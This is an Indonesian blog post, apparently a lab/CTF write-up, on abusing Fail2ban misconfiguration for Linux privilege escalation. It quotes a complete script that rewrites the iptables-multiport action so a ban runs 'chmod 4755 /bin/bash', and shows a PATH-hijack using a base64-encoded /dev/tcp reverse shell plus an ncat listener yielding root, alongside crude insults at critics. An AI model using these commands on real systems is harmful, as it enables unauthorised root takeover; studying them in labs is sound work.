---
layout: post
title: 'Note: Fail2ban PrivEsc'
date: 2022-12-28
---

Nyari sana sini ternyata beberapa blog ini, tidak berguna.

* [Author: Youssef Ichioui](https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7)
* [Title: The Cyber Security Library](https://oklencodes.gitbook.io/untitled/ctfs/biteme-ctf/fail2ban-privilege-escalation)
* [Author: JAY BHATT](https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49)
* [Author: rvizx](https://github.com/rvizx/fail2ban)

Bukan untuk menghina atau apa, tetapi saya mencoba semua metode itu yang memang kesannya `plagiarism` tetap tidak bisa ditolerir dan metode mereka semua sampah.
> Yaelah, kayanya lu aja yang lupa ngecek versinya

Matamu tak picek kene.
> Mungkin lu ga liat konfigurasinya aja bro, blablab

Raimu tak geplak kene, asu.

### Analyzing code of Rvizx's script
```sh
#!/usr/bin/bash

# title : fail2ban-privesc
# author : Ravindu Wickramasinghe (@rvizx9)


echo '
+==============================+
|  fail2ban-privesc | @rvizx9  |
+==============================+

'

conf="
[INCLUDES]
before = iptables-common.conf
[Definition]

actionstart = <iptables> -N f2b-<name>
              <iptables> -A f2b-<name> -j <returntype>
              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>

actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'
actionban = chmod 4755 /bin/bash
actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>
[Init]
"

rm -rf /etc/fail2ban/action.d/iptables-multiport.conf
echo "$conf" > iptables-multiport.conf
mv iptables-multiport.conf /etc/fail2ban/action.d/
sudo /etc/init.d/fail2ban restart
ip -br -c a

echo "[!] start to bruteforce ssh login."
echo "[run] @attacker : hydra <ip-addr> -l root -P /usr/share/wordlists/rockyou.txt ssh"
echo "[!] bash -p will be executed in 100s"
sleep 100
bash -p
```
Saya jelaskan dulu bagaimana kode ini bekerja dan membuat muak hidup saya hingga 1 jam untuk melihat bahwasanya ini adalah hal konyol. Saya tidak menggunakan script ini untuk dieksekusi, tetapi saya menggunakan ini sebagai shortcut untuk melihat apakah pasti atau tidak.

`conf` itu adalah sebuah variable yang diisi string untuk direplace ke `iptables-multiport.conf`. ya di dalamnya terdapat `actionban` dengan value `chmod 4755 /bin/bash` sebagai command yang di-abuse ke `/bin/bash` untuk mendapatkan `SETUID` dan bisa dielevasi ke `root` menggunakan parameter `-p`.

![image](https://i.postimg.cc/4x4t2ZbP/image.png)
[source](https://chmodcommand.com/chmod-4755/)

lalu perintah `sudo /etc/init.d/fail2ban` adalah relatif tergantung kasus yang ada. Perintah ini digunakan untuk memulai ulang firewall tersebut dan me-reload konfigurasi. Di kasus yang saya temukan itu menggunakan `sudo -l` abusing.

![image](https://i.postimg.cc/6pVjn96h/image.png)

Dalam konfigurasinya di `/etc/fail2ban/jail.conf` terdapat sintaks seperti ini.

![img](https://i.postimg.cc/fW2JWXxc/image.png)

Dan, untuk hal ini kode yang dibuat oleh [@rvizx](https://github.com/rvizx), valid. Kenapa? karena di dalam gambar tersebut ada perintah untuk memanggil `iptables-multiport`. Dan injeksi ke shell dengan `actionban`.

But wait, 
> KENAPA DENGAN SEMUA SHORTCUT BLOG DI ATAS TIDAK BERGUNA?

Yang jelas saya tidak tahu, padahal variable `maxretry` sudah saya isi dengan nilai `1`. 

Loh apa itu? Di dalam konfigurasi tersebut ada kode seperti ini.
```conf
# "bantime" is the number of seconds that a host is banned.
bantime  = 10m

# A host is banned if it has generated "maxretry" during the last "findtime"
# seconds.
findtime  = 10m

# "maxretry" is the number of failures before a host get banned.
maxretry = 1

# "maxmatches" is the number of matches stored in ticket (resolvable via tag <matches> in actions).
maxmatches = %(maxretry)s
```
Nah loh, hasilnya saya menggunakan metode `PATH Hijacking` untuk membuat fake `iptables` ke `/dev/shm` dengan revshell favorit saya.
```
╭─ via [machines/fate]
╰─ echo "/bin/bash -i >& /dev/tcp/192.168.59.1/12345 0>&1" | base64
L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTkuMS8xMjM0NSAwPiYxCg==
```
Ini !
```sh
john@fate:/dev/shm$ echo "echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTkuMS8xMjM0NSAwPiYxCg== | base64 -d | bash" > /dev/shm/iptables
john@fate:/dev/shm$ chmod +x iptables
john@fate:/dev/shm$ export PATH=$(pwd):$PATH
john@fate:/dev/shm$ sudo -u root systemctl restart fail2ban
```
Lalu, login dengan ssh dan buatlah kalau itu gagal. Lalu nyalakan *network utility which reads and writes data across networks*, aka `ncat`.
Dan boom!
```
╭─ via [machines/fate]
╰─ ncat -nvlp 12345
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 192.168.59.15.
Ncat: Connection from 192.168.59.15:56780.
bash: no se puede establecer el grupo de proceso de terminal (27981): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
root@fate:/# id
id
uid=0(root) gid=0(root) grupos=0(root)
root@fate:/# cd
```
